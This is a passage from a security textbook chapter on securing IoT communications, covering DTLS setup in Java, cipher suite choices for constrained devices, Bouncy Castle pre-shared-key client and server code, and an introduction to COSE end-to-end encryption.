 ;         }     } }  Print out the  received data.  You can now start the server by running the following command:  mvn clean compile exec:java \   -Dexec.mainClass=com.manning.apisecurityinaction.DtlsServer  Create the DtlsDatagram- Channel and bind to port 54321.  2 Refer to chapter 3 if you haven't installed mkcert yet.   452  CHAPTER 12 Securing IoT communications  This will produce many lines of output as it compiles and runs the code. You’ll see the following line of output once the server has started up and is listening for UDP pack- ets from clients:  [com.manning.apisecurityinaction.DtlsServer.main  ] INFO  ➥ com.manning.apisecurityinaction.DtlsServer - Listening on port  ➥ 54321  You can now run the client in another terminal window by running:  mvn clean compile exec:java \   -Dexec.mainClass=com.manning.apisecurityinaction.DtlsClient  TIP If  you  want  to  see  details  of  the  DTLS  protocol  messages  being  sent between the client and server, add the argument -Djavax.net.debug=all to the  Maven  command  line.  This  will  produce  detailed  logging  of  the  hand- shake messages.  The client will start up, connect to the server, and send all of the lines of text from the input file to the server, which will receive them all and print them out. After the client has completed, it will print out the DTLS cipher suite that it used so that you can see what was negotiated. In the next section, you’ll see how the default choice made by Java might not be appropriate for IoT applications and how to choose a more suitable replacement.  NOTE This example is intended to demonstrate the use of DTLS only and is not a production-ready network protocol. If you separate the client and server over a network, it is likely that some packets will get lost. Use a higher-level application protocol such as CoAP if your application requires reliable packet delivery  or use normal TLS over TCP .  12.1.2 Cipher suites for constrained devices  In  previous  chapters,  you’ve  followed  the  guidance  from  Mozilla3  when  choosing secure TLS cipher suites  recall from chapter 7 that a cipher suite is a collection of cryp- tographic algorithms chosen to work well together . This guidance is aimed at secur- ing  traditional  web  server  applications  and their  clients,  but  these  cipher  suites  are not always suitable for IoT use for several reasons:   The size of code required to implement these suites securely can be quite large and  require  many  cryptographic  primitives.  For  example,  the  cipher  suite ECDHE-RSA-AES256-SHA384 requires implementing Elliptic Curve Diffie-Hellman  ECDH  key agreement, RSA signatures, AES encryption and decryption opera- tions, and the SHA-384 hash function with HMAC!  3 See https:  wiki.mozilla.org Security Server_Side_TLS.   Transport layer security  453   Modern recommendations heavily promote the use of AES in Galois Counter Mode  GCM , because this is extremely fast and secure on modern Intel chips due to hardware acceleration. But it can be difficult to implement securely in software on constrained devices and fails catastrophically if misused.    Some cryptographic algorithms, such as SHA-512 or SHA-384, are rarely hardware- accelerated and are designed to perform well when implemented in software on 64-bit  architectures.  There  can  be  a  performance  penalty  when  implementing these algorithms on 32-bit architectures, which are very common in IoT devices. In  low-power  environments,  8-bit  microcontrollers  are  still  commonly  used, which makes implementing such algorithms even more challenging.   Modern  recommendations  concentrate  on  cipher  suites  that  provide  forward secrecy as discussed in chapter 7  also known as perfect forward secrecy . This is a very  important  security  property,  but  it  increases  the  computational  cost  of these cipher suites. All of the forward secret cipher suites in TLS require imple- menting both a signature algorithm  such as RSA  and a key agreement algo- rithm  usually, ECDH , which increases the code size.4  Nonce reuse and AES-GCM in DTLS The  most  popular  symmetric  authenticated  encryption  mode  used  in  modern  TLS applications is based on AES in Galois Counter Mode  GCM . GCM requires that each packet is encrypted using a unique nonce and loses almost all security if the same nonce is used to encrypt two different packets. When GCM was first introduced for TLS 1.2, it required an 8-byte nonce to be explicitly sent with every record. Although this nonce could be a simple counter, some implementations decided to generate it randomly. Because 8 bytes is not large enough to safely generate randomly, these implementations were found to be susceptible to accidental nonce reuse. To prevent this problem, TLS 1.3 introduced a new scheme based on implicit nonces: the nonce for a TLS record is derived from the sequence number that TLS already keeps track of  for  each  connection.  This  was  a  significant  security  improvement  because  TLS implementations  must  accurately  keep  track  of  the  record  sequence  number  to ensure proper operation of the protocol, so accidental nonce reuse will result in an immediate protocol failure  and is more likely to be caught by tests . You can read more about this development at https:  blog.cloudflare.com tls-nonce-nse .  Due  to  the  unreliable  nature  of  UDP-based  protocols,  DTLS  requires  that  record sequence numbers are explicitly added to all packets so that retransmitted or reor- dered packets can be detected and handled. Combined with the fact that DTLS is more lenient of duplicate packets, this makes accidental nonce reuse bugs in DTLS applications  using  AES  GCM  more  likely.  You  should  therefore  prefer  alternative cipher suites when using DTLS, such as those discussed in this section. In section 12.3.3, you’ll learn about authenticated encryption algorithms you can use in your application that are more robust against nonce reuse.  4 Thomas Pornin, the author of the BearSSL library, has detailed notes on the cost of different TLS crypto-  graphic algorithms at https:  bearssl.org support.html.    454  CHAPTER 12 Securing IoT communications  Figure  12.4  shows  an  overview  of  the  software  components  and  algorithms  that  are required to support a set of TLS cipher suites that are commonly used for web con- nections. TLS supports a variety of key exchange algorithms used during the initial handshake,  each  of  which  needs  different  cryptographic  primitives  to  be  imple- mented. Some of these also require digital signatures to be implemented, again with several  choices  of  algorithms.  Some  signature  algorithms  support  different  group parameters, such as elliptic curves used for ECDSA signatures, which require further code. After the handshake completes, there are several choices for cipher modes and MAC algorithms for securing application data. X.509 certificate authentication itself requires additional code. This can add up to a significant amount of code to include on a constrained device.  Key exchange algorithms and signatures are used during the initial handshake to establish session keys.

Certiﬁcate validation and revocation checking involves a lot of complex code.  Figure 12.4 A cross-section of algorithms and components that must be implemented  to support common TLS web connections. Key exchange and signature algorithms are  used during the initial handshake, and then cipher modes and MACs are used to secure  application data once a session has been established. X.509 certificates require a lot  of complex code for parsing, validation, and checking for revoked certificates.   Transport layer security  455  For  these  reasons,  other  cipher  suites  are  often  popular  in  IoT  applications.  As  an alternative  to  forward  secret  cipher  suites,  there  are  older  cipher  suites  based  on either RSA encryption or static Diffie-Hellman key agreement  or the elliptic curve variant, ECDH . Unfortunately, both algorithm families have significant security weak- nesses, not directly related to their lack of forward secrecy. RSA key exchange uses an old mode of encryption  known as PKCS1 version 1.5  that is very hard to implement securely  and  has  resulted  in  many  vulnerabilities  in  TLS  implementations.  Static ECDH  key  agreement  has  potential  security  weaknesses  of  its  own,  such  as  invalid curve attacks that can reveal the server’s long-term private key; it is rarely implemented. For these reasons, you should prefer forward secret cipher suites whenever possible, as they provide better protection against common cryptographic vulnerabilities. TLS 1.3 has completely removed these older modes due to their insecurity.  DEFINITION An invalid curve attack is an attack on elliptic curve cryptographic keys. An attacker sends the victim a public key on a  different  but related  elliptic curve to the victim’s private key. If the victim’s TLS library doesn’t val- idate the received public key carefully, then the result may leak information about their private key. Although ephemeral ECDH cipher suites  those with ECDHE  in  the  name   are  also  vulnerable  to  invalid  curve  attacks,  they  are much harder to exploit because each private key is only used once.  Even if you use an older cipher suite, a DTLS implementation is required to include support for signatures in order to validate certificates that are presented by the server  and optionally by the client  during the handshake. An extension to TLS and DTLS allows  certificates  to  be  replaced  with  raw  public  keys   https:  tools.ietf.org html  rfc7250 . This allows the complex certificate parsing and validation code to be elimi- nated, along with support for many signature algorithms, resulting in a large reduc- tion in code size. The downside is that keys must instead be manually distributed to all devices, but this can be a viable approach in some environments. Another alternative is to use pre-shared keys, which you’ll learn more about in section 12.2.  DEFINITION Raw public keys can be used to eliminate the complex code required to parse and verify X.509 certificates and verify signatures over those certifi- cates. A raw public key must be manually distributed to devices over a secure channel  for example, during manufacture .  The situation is somewhat better when you look at the symmetric cryptography used to secure application data after the TLS handshake and key exchange has completed. There  are  two  alternative  cryptographic  algorithms  that  can  be  used  instead  of  the usual AES-GCM and AES-CBC modes:   Cipher suites based on AES in CCM mode provide authenticated encryption using only an AES encryption circuit, providing a reduction in code size compared to CBC mode and is a bit more robust compared to GCM. CCM has become widely adopted in IoT applications and standards, but it has some undesirable features   456  CHAPTER 12 Securing IoT communications  too, as discussed in a critique of the mode by Phillip Rogaway and David Wagner  https:  web.cs.ucdavis.edu ~rogaway papers ccm.pdf .   The ChaCha20-Poly1305 cipher suites can be implemented securely in software with relatively little code and good performance on a range of CPU architec- tures.  Google  adapted  these  cipher  suites  for  TLS  to  provide  better  perfor- mance and security on mobile devices that lack AES hardware acceleration.  DEFINITION AES-CCM  Counter with CBC-MAC  is an authenticated encryp- tion  algorithm  based  solely  on  the  use  of  an  AES  encryption  circuit  for  all operations. It uses AES in Counter mode for encryption and decryption, and a  Message  Authentication  Code   MAC   based  on  AES  in  CBC  mode  for authentication. ChaCha20-Poly1305 is a stream cipher and MAC designed by Daniel Bernstein that is very fast and easy to implement in software.  Both  of  these  choices  have  fewer  weaknesses  compared  to  either  AES-GCM  or  the older  AES-CBC  modes  when  implemented  on  constrained  devices.5  If  your  devices have hardware support for AES, for example in a dedicated secure element chip, then CCM can be an attractive choice. In most other cases, ChaCha20-Poly1305 can be eas- ier to implement securely. Java has support for ChaCha20-Poly1305 cipher suites since Java 12. If you have Java 12 installed, you can force the use of ChaCha20-Poly1305 by specifying a custom SSLParameters object and passing it to the setSSLParameters   method on the SSLEngine. Listing 12.7 shows how to configure the parameters to only allow ChaCha20-Poly1305-based cipher suites. If you have Java 12, open the Dtls- Client.java file and add the new method to the class. Otherwise, skip this example.  TIP If you need to support servers or clients running older versions of DTLS, you  should  add  the  TLS_EMPTY_RENEGOTIATION_INFO_SCSV  marker  cipher suite.  Otherwise  Java  may  be  unable  to  negotiate  a  connection  with  some older software. This cipher suite is enabled by default so be sure to re-enable it when specifying custom cipher suites.  Listing 12.7 Forcing use of ChaCha20-Poly1305  Use the defaults from the DtlsDatagram- Channel.  private static SSLParameters sslParameters   {     var params = DtlsDatagramChannel.defaultSslParameters  ;         params.setCipherSuites new String[] {                                    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",                 "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",                   "TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256",                     "TLS_EMPTY_RENEGOTIATION_INFO_SCSV"          } ;     return params; }  Enable only  cipher suites that  use ChaCha20- Poly1305.  Include this cipher suite  if you need to support  multiple DTLS versions.  5 ChaCha20-Poly1305 also suffers from nonce reuse problems similar to GCM, but to a lesser extent. GCM loses all authenticity guarantees after a single nonce reuse, while ChaCha20-Poly1305 only loses these guarantees for messages encrypted with the duplicate nonce.   Transport layer security  457  After adding the new method, you can update the call to the DtlsDatagramChannel constructor in the same file to pass the custom parameters:  try  var channel = new DtlsDatagramChannel getClientContext  ,     sslParameters   ;  If you make that change and re-run the client, you’ll see that the connection now uses ChaCha20-Poly1305, so long as both the client and server are using Java 12 or later.  WARNING The example in listing 12.7 uses the default parameters from the DtlsDatagramChannel class. If you create your own parameters, ensure that you set an endpoint identification algorithm. Otherwise, Java won’t validate that the server’s certificate matches the hostname you have connected to and the connection may be vulnerable to man-in-the-middle attacks. You can set the identification algorithm by calling "params.setEndpointIdentication- Algorithm "HTTPS" ".  AES-CCM is not yet supported by Java, although work is in progress to add support. The  Bouncy  Castle  library   https:  www.bouncycastle.org java.html   supports  CCM cipher suites with DTLS, but only through a different API and not the standard SSL- Engine API. There’s an example using the Bouncy Castle DTLS API with CCM in sec- tion 12.2.1.   The CCM cipher suites come in two variations:  The original cipher suites, whose names end in _CCM, use a 128-bit authentica-  tion tag.   Cipher suites ending in _CCM_8, which use a shorter 64-bit authentication tag. This can be useful if you need to save every byte in network messages but pro- vides much weaker protections against message forgery and tampering.  You should therefore prefer using the variants with a 128-bit authentication tag unless you have other measures in place to prevent message forgery, such as strong network protections, and you know that you need to reduce network overheads. You should apply strict rate-limiting to API endpoints where there is a risk of brute force attacks against authentication tags; see chapter 3 for details on how to apply rate-limiting.

In some particularly constrained environments, devices may not be capable of carry- ing out the public key cryptography required for a TLS handshake. For example, tight constraints on available memory and code size may make it hard to support public key signature or key-agreement algorithms. In these environments, you can still use TLS  or DTLS  by using cipher suites based on pre-shared keys  PSK  instead of certificates for authentication. PSK cipher suites can result in a dramatic reduction in the amount of code needed to implement TLS, as shown in figure 12.5, because the certificate pars- ing and validation code, along with the signatures and public key exchange modes can all be eliminated.  DEFINITION A  pre-shared  key   PSK   is  a  symmetric  key  that  is  directly  shared with the client and server ahead of time. A PSK can be used to avoid the over- heads of public key cryptography on constrained devices.  In TLS 1.2 and DTLS 1.2, a PSK can be used by specifying dedicated PSK cipher suites such as TLS_PSK_WITH_AES_128_CCM. In TLS 1.3 and the upcoming DTLS 1.3, use of a PSK is negotiated using an extension that the client sends in the initial ClientHello message. Once a PSK cipher suite has been selected, the server and client derive ses- sion keys from the PSK and random values that they each contribute during the hand- shake,  ensuring  that  unique  keys  are  still  used  for  every  session.  The  session  key  is used to compute a HMAC tag over all of the handshake messages, providing authenti- cation  of  the  session:  only  somebody  with  access  to  the  PSK  could  derive  the  same HMAC key and compute the correct authentication tag.   CAUTION Although unique session keys are generated for each session, the basic  PSK  cipher  suites  lack  forward  secrecy:  an  attacker  that  compromises the  PSK  can  easily  derive  the  session  keys  for  every  previous  session  if  they captured the handshake messages. Section 12.2.4 discusses PSK cipher suites with forward secrecy.  Because  PSK  is  based  on  symmetric  cryptography,  with  the  client  and  server  both using the same key, it provides mutual authentication of both parties. Unlike client   Pre-shared keys  459  Only a single simple key exchange algorithm is required.

Figure 12.5 Use of pre-shared key  PSK  cipher suites allows implementations to remove a  lot of complex code from a TLS implementation. Signature algorithms are no longer needed  at all and can be removed, as can most key exchange algorithms. The complex X.509  certificate parsing and validation logic can be deleted too, leaving only the basic symmetric  cryptography primitives.  certificate authentication, however, there is no name associated with the client apart from an opaque identifier for the PSK, so a server must maintain a mapping between PSKs and the associated client or rely on another method for authenticating the cli- ent’s identity.  WARNING Although  TLS  allows  the  PSK  to  be  any  length,  you  should  only use  a  PSK  that  is  cryptographically  strong,  such  as  a  128-bit  value  from  a secure random number generator. PSK cipher suites are not suitable for use with  passwords  because  an  attacker  can  perform  an  offline  dictionary  or brute-force attack after seeing one PSK handshake.   460  CHAPTER 12 Securing IoT communications  12.2.1 Implementing a PSK server  Listing 12.8 shows how to load a PSK from a keystore. For this example, you can load the existing HMAC key that you created in chapter 6, but it is good practice to use dis- tinct keys for different uses within an application even if they happen to use the same algorithm. A PSK is just a random array of bytes, so you can call the getEncoded   method  to  get  the  raw  bytes  from  the  Key  object.  Create  a  new  file  named  Psk- Server.java under src main java com manning apisecurityinaction and copy in the contents of the listing. You’ll flesh out the rest of the server in a moment.  Listing 12.8 Loading a PSK  package com.manning.apisecurityinaction;  import static java.nio.charset.StandardCharsets.UTF_8; import java.io.FileInputStream; import java.net.*; import java.security.*; import org.bouncycastle.tls.*; import org.bouncycastle.tls.crypto.impl.bc.BcTlsCrypto;  Load the keystore.  public class PskServer {     static byte[] loadPsk char[] password  throws Exception {         var keyStore = KeyStore.getInstance "PKCS12" ;                            keyStore.load new FileInputStream "keystore.p12" , password ;             return keyStore.getKey "hmac-key", password .getEncoded  ;            } }  Load the key and extract the raw bytes.  Listing 12.9 shows a basic DTLS server with pre-shared keys written using the Bouncy Castle  API.  The  following  steps  are  used  to  initialize  the  server  and  perform  a  PSK handshake with the client:   First load the PSK from the keystore.   Then  you  need  to  initialize  a  PSKTlsServer  object,  which  requires  two  argu- ments: a BcTlsCrypto object and a TlsPSKIdentityManager, that is used to look up the PSK for a given client. You’ll come back to the identity manager shortly.   The  PSKTlsServer  class  only  advertises  support  for  normal  TLS  by  default, although it supports DTLS just fine. Override the  getSupportedVersions   method  to  ensure  that  DTLS  1.2  support  is  enabled;  otherwise,  the  hand- shake will fail. The supported protocol versions are communicated during the handshake and some clients may fail if there are both TLS and DTLS versions in the list.   Just like the  DtlsDatagramChannel you used before,  Bouncy Castle requires the UDP socket to be connected before the DTLS handshake occurs. Because the server doesn’t know where the client is located, you can wait until a packet is received from any client and then call connect   with the socket address of the client.   Pre-shared keys  461   Create  a  DTLSServerProtocol  and  UDPTransport  objects,  and  then  call  the accept method on the protocol object to perform the DTLS handshake. This returns  a  DTLSTransport  object  that  you  can  then  use  to  send  and  receive encrypted and authenticated packets with the client.  TIP Although the Bouncy Castle API is straightforward when using PSKs, I find it cumbersome and hard to debug if you want to use certificate authenti- cation, and I prefer the SSLEngine API.  Listing 12.9 DTLS PSK server  Create a new PSKTlsServer and override the supported versions to allow DTLS.  public static void main String[] args  throws Exception {     var psk = loadPsk args[0].toCharArray   ;                    var crypto = new BcTlsCrypto new SecureRandom   ;     var server = new PSKTlsServer crypto, getIdentityManager psk   {            @Override                                                               protected ProtocolVersion[] getSupportedVersions   {                        return ProtocolVersion.DTLSv12.only  ;                              }                                                                   };                                                                      var buffer = new byte[2048];     var serverSocket = new DatagramSocket 54321 ;     var packet = new DatagramPacket buffer, buffer.length ;     serverSocket.receive packet ;                                 serverSocket.connect packet.getSocketAddress   ;               var protocol = new DTLSServerProtocol  ;                      var transport = new UDPTransport serverSocket, 1500 ;         var dtls = protocol.accept server, transport ;             Receive messages from the client and print them out.      while  true  {                                                        var len = dtls.receive buffer, 0, buffer.length, 60000 ;          if  len == -1  break;                                             var data = new String buffer, 0, len, UTF_8 ;                     System.out.println "Received: " + data ;                      }                                                             }  Load the PSK from  the keystore.  BouncyCastle  requires the socket  to be connected  before the  handshake.  Create a DTLS  protocol and  perform the  handshake using  the PSK.  The missing part of the puzzle is the PSK identity manager, which is responsible for determining  which  PSK  to  use  with  each  client.  Listing  12.10  shows  a  very  simple implementation  of  this  interface  for  the  example,  which  returns  the  same  PSK  for every client. The client sends an identifier as part of the PSK handshake, so a more sophisticated implementation could look up different PSKs for each client. The server can also provide a hint to help the client determine which PSK it should use, in case it has multiple PSKs. You can leave this null here, which instructs the server not to send a hint. Open the PskServer.java file and add the method from listing 12.10 to com- plete the server implementation.  TIP A scalable solution would be for the server to generate distinct PSKs for each client from a master key using HKDF, as discussed in chapter 11.   462  CHAPTER 12 Securing IoT communications  Listing 12.10 The PSK identity manager  static TlsPSKIdentityManager getIdentityManager byte[] psk  {     return new TlsPSKIdentityManager   {         @Override         public byte[] getHint   {                   return null;                        }                                Leave the PSK  hint unspecified.          @Override         public byte[] getPSK byte[] identity  {                return psk;                                    }                                              }; }  Return the same  PSK for all clients.  12.2.2 The PSK client  The PSK client is very similar to the server, as shown in listing 12.11. As before, you create a new BcTlsCrypto object and use that to initialize a PSKTlsClient object. In this case, you pass in the PSK and an identifier for it. If you don’t have a good identi- fier for your PSK already, then a secure hash of the PSK works well. You can use the Crypto.hash    method  from  the  Salty  Coffee  library  from  chapter  6,  which  uses SHA-512.  As  for  the  server,  you  need  to  override  the  getSupportedVersions   method to ensure DTLS support is enabled. You can then connect to the server and perform the DTLS handshake using the DTLSClientProtocol object. The connect   method  returns  a  DTLSTransport  object  that  you  can  then  use  to  send  and  receive encrypted packets with the server.   Create a new file named PskClient.java alongside the server class and type in the contents of the listing to create the server. If your editor doesn’t automatically add them, you’ll need to add the following imports to the top of the file:  import static java.nio.charset.StandardCharsets.UTF_8; import java.io.FileInputStream; import java.net.*; import java.security.*; import org.bouncycastle.tls.*; import org.bouncycastle.tls.crypto.impl.bc.BcTlsCrypto;  Listing 12.11 The PSK client  package com.manning.apisecurityinaction; public class PskClient {     public static void main String[] args  throws Exception {         var psk = PskServer.loadPsk args[0].toCharArray   ;              var pskId = Crypto.hash psk ;                                     var crypto = new BcTlsCrypto new SecureRandom   ;               var client = new PSKTlsClient crypto, pskId, psk  {                 @Override  Load the PSK  and generate  an ID for it.  Create a  PSKTlsClient  with the PSK.   Pre-shared keys  463              protected ProtocolVersion[] getSupportedVersions   {                    return ProtocolVersion.DTLSv12.only  ;                          }                                                               };  Override the supported versions to ensure DTLS support.          var address = InetAddress.getByName "localhost" ;         var socket = new DatagramSocket  ;         socket.connect address, 54321 ;                             socket.send new DatagramPacket new byte[0], 0  ;            var transport = new UDPTransport socket, 1500 ;              var protocol = new DTLSClientProtocol  ;                     var dtls = protocol.connect client, transport ;       Connect to the  server and send  a dummy packet  to start the  handshake.  Create the DTLSClientProtocol instance and perform the handshake over UDP.          try  var in = Files.newBufferedReader Paths.get "test.txt"    {             String line;             while   line = in.readLine    != null  {                 System.out.println "Sending: " + line ;                 var buf = line.getBytes UTF_8 ;                 dtls.send buf, 0, buf.length ;                 }         }     } }  Send encrypted packets  using the returned  DTLSTransport object.  You can now test out the handshake by running the server and client in separate ter- minal windows. Open two terminals and change to the root directory of the project in both. Then run the following in the first one:  mvn clean compile exec:java \  -Dexec.mainClass=com.manning.apisecurityinaction.PskServer \  -Dexec.args=changeit         Specify the keystore  password as an argument.  This will compile and run the server class. If you’ve changed the keystore password, then supply the correct value on the command line. Open the second terminal win- dow and run the client too:  mvn exec:java \  -Dexec.mainClass=com.manning.apisecurityinaction.PskClient \  -Dexec.args=changeit  After the compilation has finished, you’ll see the client sending the lines of text to the server and the server receiving them.  NOTE As in previous examples, this sample code makes no attempt to handle lost packets after the handshake has completed.  12.2.3 Supporting raw PSK cipher suites  By  default,  Bouncy  Castle  follows  the  recommendations  from  the  IETF  and  only enables PSK cipher suites combined with ephemeral Diffie-Hellman key agreement to provide forward secrecy. These cipher suites are discussed in section 12.1.4. Although   464  CHAPTER 12 Securing IoT communications  these are more secure than the raw PSK cipher suites, they are not suitable for very constrained  devices  that  can’t  perform  public  key  cryptography.  To  enable  the  raw PSK cipher suites, you have to override the getSupportedCipherSuites   method in both the client and the server. Listing 12.12 shows how to override this method for the server, in this case providing support for just a single PSK cipher suite using AES-CCM to force its use. An identical change can be made to the PSKTlsClient object.  Listing 12.12 Enabling raw PSK cipher suites  var server = new PSKTlsServer crypto, getIdentityManager psk   {     @Override     protected ProtocolVersion[] getSupportedVersions   {         return ProtocolVersion.DTLSv12.only  ;     }     @Override     protected int[] getSupportedCipherSuites   {               return new int[] {                                            CipherSuite.TLS_PSK_WITH_AES_128_CCM            };                                                 }                                                  };  Override the  getSupportedCipherSuites  method to return raw  PSK suites.  Bouncy Castle supports a wide range of raw PSK cipher suites in DTLS 1.2, shown in table 12.2. Most of these also have equivalents in TLS 1.3. I haven’t listed the older variants using CBC mode or those with unusual ciphers such as Camellia  the Japa- nese equivalent of AES ; you should generally avoid these in IoT applications.

If confidentiality of data is important to your application and your devices can support a limited amount of public key cryptography, you can opt for PSK cipher suites com- bined  with  ephemeral  Diffie-Hellman  key  agreement  to  ensure  forward  secrecy.  In these cipher suites, authentication of the client and server is still guaranteed by the PSK, but both parties generate random public-private key-pairs and swap the public keys during the handshake, as shown in figure 12.6. The output of a Diffie-Hellman key  agreement  between  each  side’s  ephemeral  private  key  and  the  other  party’s ephemeral public key is then mixed into the derivation of the session keys. The magic of Diffie-Hellman ensures that the session keys can’t be recovered by an attacker that observes the handshake messages, even if they later recover the PSK. The ephemeral private keys are scrubbed from memory as soon as the handshake completes.  The client and server share the same pre-shared key  PSK .  Client  PSK  Ephemeral  key pair  ClientHello  ServerHello  ServerKeyExchange:  - PSK ID hint  - Ephemeral PK  ClientKeyExchange:  - PSK ID  - Ephemeral PK  Server  PSK  Ephemeral  key pair  Each side generates a fresh random ephemeral key pair for each connection.  The ephemeral public keys are exchanged during the handshake in KeyExchange messages along with the ID of the PSK.  Figure 12.6 PSK cipher suites with forward secrecy use ephemeral key pairs  in addition to the PSK. The client and server swap ephemeral public keys in  key exchange messages during the TLS handshake. A Diffie-Hellman key  agreement is then performed between each side’s ephemeral private key and  the received ephemeral public key, which produces an identical secret value  that is then mixed into the TLS key derivation process.   466  CHAPTER 12 Securing IoT communications  Custom protocols and the Noise protocol framework Although for most IoT applications TLS or DTLS should be perfectly adequate for your needs, you may feel tempted to design your own cryptographic protocol that is a cus- tom fit for your application. This is almost always a mistake, because even experi- enced  cryptographers  have  made  serious  mistakes  when  designing  protocols. Despite this widely repeated advice, many custom IoT security protocols have been developed, and new ones continue to be made. If you feel that you must develop a custom protocol for your application and can’t use TLS or DTLS, the Noise protocol framework  https:  noiseprotocol.org  can be used as a starting point. Noise describes how to construct a secure protocol from a few basic building blocks and describes a variety of handshakes that achieve different security goals. Most importantly, Noise is designed and reviewed by experts and has been used in real-world applications, such as the WireGuard VPN protocol  https:  www.wireguard.com .  Table 12.3 shows some recommended PSK cipher suites for TLS or DTLS 1.2 that pro- vide forward secrecy. The ephemeral Diffie-Hellman keys can be based on either the original finite-field Diffie-Hellman, in which case the suite names contain DHE, or on elliptic  curve  Diffie-Hellman,  in  which  case  they  contain  ECDHE.  In  general,  the ECDHE variants are better-suited to constrained devices because secure parameters for DHE require large key sizes of 2048 bits or more. The newer X25519 elliptic curve is efficient and secure when implemented in software, but it has only recently been standardized for use in TLS 1.3.6 The secp256r1 curve  also known as prime256v1 or P-256  is commonly implemented by low-cost secure element microchips and is a rea- sonable choice too.

End-to-end security  467  All of the CCM cipher suites also come in a CCM_8 variant that uses a short 64-bit authentication tag. As previously discussed, these variants should only be used if you need to save every byte of network use and you are confident that you have alternative measures  in  place  to  ensure  authenticity  of  network  traffic.  AES-GCM  is  also  sup- ported by PSK cipher suites, but I would not recommend it in constrained environ- ments due to the increased risk of accidental nonce reuse.  Pop quiz 3  True or False: PSK cipher suites without forward secrecy derive the same encryp- tion keys for every session.  4 Which  one  of  the  following  cryptographic  primitives  is  used  to  ensure  forward  secrecy in PSK cipher suites that support this? a RSA encryption b RSA signatures c HKDF key derivation d Diffie-Hellman key agreement e Elliptic curve digital signatures  The answers are at the end of the chapter.  12.3 End-to-end security  TLS and DTLS provide excellent security when an API client can talk directly to the server.  However,  as  mentioned  in  the  introduction  to  section  12.1,  in  a  typical  IoT application messages may travel over multiple different protocols. For example, sen- sor data produced by devices may be sent over low-power wireless networks to a local gateway,  which  then  puts  them  onto  a  MQTT  message  queue  for  transmission  to another service, which aggregates the data and performs a HTTP POST request to a cloud REST API for analysis and storage. Although each hop on this journey can be secured using TLS, messages are available unencrypted while being processed at the intermediate  nodes.  This  makes  these  intermediate  nodes  an  attractive  target  for attackers because, once compromised, they can view and manipulate all data flowing through that device.   The solution is to provide end-to-end security of all data, independent of the trans- port layer security. Rather than relying on the transport protocol to provide encryp- tion  and  authentication,  the  message  itself  is  encrypted  and  authenticated.  For example,  an  API  that  expects  requests  with  a  JSON  payload   or  an  efficient  binary alternative  can be adapted to accept data that has been encrypted with an authenti- cated encryption algorithm, which it then manually decrypts and verifies as shown in figure 12.7. This ensures that an API request encrypted by the original client can only be decrypted by the destination API, no matter how many different network protocols are used to transport the request from the client to its destination.   468  CHAPTER 12 Securing IoT communications  Device  …  BLE  Device requests are individually encrypted and authenticated, creating a message envelope.  Gateways can still translate the unencrypted transport protocol headers.  Gateway  Gateway  MQTT  The encrypted request passes through gateways without being decrypted.  HTTP  …  Cloud  API  The target API decrypts and validates the received message to retrieve the original API request.  Figure 12.7 In end-to-end security, API requests are individually encrypted and  authenticated by the client device. These encrypted requests can then traverse  multiple transport protocols without being decrypted. The API can then decrypt the  request and verify it hasn’t been tampered with before processing the API request.  NOTE End-to-end security is not a replacement for transport layer security. Transport protocol messages contain headers and other details that are not protected  by  end-to-end  encryption  or  authentication.  You  should  aim  to include security at both layers of your architecture.  End-to-end security involves more than simply encrypting and decrypting data pack- ets.  Secure  transport  protocols,  such  as  TLS,  also  ensure  that  both  parties  are  ade- quately authenticated, and that data packets cannot be reordered or replayed. In the next few sections you’ll see how to ensure the same protections are provided when using end-to-end security.  12.3.1 COSE  If you wanted to ensure end-to-end security of requests to a regular JSON-based REST API, you might be tempted to look at the JOSE  JSON Object Signing and Encryp- tion  standards discussed in chapter 6. For IoT applications, JSON is often replaced by more efficient binary encodings that make better use of constrained memory and net- work  bandwidth  and  that  have  compact  software  implementations.  For  example, numeric data such as sensor readings is typically encoded as decimal strings in JSON, with  only  10  possible  values  for  each  byte,  which  is  wasteful  compared  to  a  packed binary encoding of the same data.    End-to-end security  469   Several binary alternatives to JSON have become popular in recent years to over- come  these  problems.  One  popular  choice  is  Concise  Binary  Object  Representation  CBOR , which provides a compact binary format that roughly follows the same model as JSON, providing support for objects consisting of key-value fields, arrays, text and binary  strings,  and  integer  and  floating-point  numbers.  Like  JSON,  CBOR  can  be parsed and processed without a schema. On top of CBOR, the CBOR Object Signing and Encryption  COSE; https:  tools.ietf.org html rfc8152  standards provide simi- lar cryptographic capabilities as JOSE does for JSON.  DEFINITION CBOR  Concise Binary Object Representation  is a binary alterna- tive to JSON. COSE  CBOR Object Signing and Encryption  provides encryp- tion and digital signature capabilities for CBOR and is loosely based on JOSE.  Although COSE is loosely based on JOSE, it has diverged quite a lot, both in the algo- rithms supported and in how messages are formatted. For example, in JOSE symmet- ric MAC, algorithms like HMAC are part of JWS  JSON Web Signatures  and treated as  equivalent  to  public  key  signature  algorithms.  In  COSE,  MACs  are  treated  more like authenticated encryption algorithms, allowing the same key agreement and key wrapping algorithms to be used to transmit a per-message MAC key.   In terms of algorithms, COSE supports many of the same algorithms as JOSE, and adds additional algorithms that are more suited to constrained devices, such as AES- CCM and ChaCha20-Poly1305 for authenticated encryption, and truncated version of HMAC-SHA-256  that  produces  a  smaller  64-bit  authentication  tag.  It  also  removes some algorithms with perceived weaknesses, such as RSA with PKCS1 v1.5 padding and AES in CBC mode with a separate HMAC tag. Unfortunately, dropping support for CBC  mode  means  that  all  of  the  COSE  authenticated  encryption  algorithms  require nonces  that  are  too  small  to  generate  randomly.  This  is  a  problem,  because  when implementing  end-to-end encryption, there  are no  session keys or record  sequence numbers that can be used to safely implement a deterministic nonce.   Thankfully, COSE has a solution in the form of HKDF  hash-based key derivation function  that you used in chapter 11. Rather than using a key to directly encrypt a message, you can instead use the key along with a random nonce to derive a unique key  for  every  message.  Because  nonce  reuse  problems  only  occur  if  you  reuse  a nonce with the same key, this reduces the risk of accidental nonce reuse consider- ably, assuming that your devices have access to an adequate source of random data  see section 12.3.2 if they don’t .   To demonstrate the use of COSE for encrypting messages, you can use the Java ref- erence  implementation  from  the  COSE  working  group.  Open  the  pom.xml  file  in your editor and add the following lines to the dependencies section:7     7 The author of the reference implementation, Jim Schaad, also runs a winery named August Cellars in Oregon  if you are wondering about the domain name.   470  CHAPTER 12 Securing IoT communications               com.augustcellars.cose         cose-java         1.1.0         Listing 12.13 shows an example of encrypting a message with COSE using HKDF to derive a unique key for the message and AES-CCM with a 